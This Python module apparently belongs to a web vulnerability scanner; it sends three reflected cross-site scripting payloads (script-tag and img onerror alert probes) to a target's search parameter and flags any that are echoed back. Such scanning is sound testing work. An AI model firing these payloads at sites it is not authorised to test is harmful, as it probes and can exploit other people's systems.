import requests
from .utils import create_result

def xss_attack_test(base_url, options=None):
    """
    Tests for reflected XSS vulnerabilities.
    Returns a standardized result dictionary.
    """
    if options is None:
        options = {}
    
    result_logs = []
    payloads = [
        "<script>alert('XSS')</script>",
        "\"><script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
    ]
    
    endpoint = options.get("endpoint", "/search")
    param_name = options.get("param_name", "q")
    
    overall_success = True
    for payload in payloads:
        url = f"{base_url.rstrip('/')}{endpoint}?{param_name}={payload}"
        try:
            response = requests.get(url, timeout=10)
            result_logs.append(f"[XSS Test] Sent payload '{payload}' to {url} (Status: {response.status_code})")
            if payload in response.text:
                result_logs.append(f"Possible XSS vulnerability detected with payload '{payload}'.")
        except Exception as e:
            overall_success = False
            result_logs.append(f"Error while testing XSS payload '{payload}': {str(e)}")
    
    return create_result(
        logs=result_logs,
        score=7,
        success=overall_success
    )
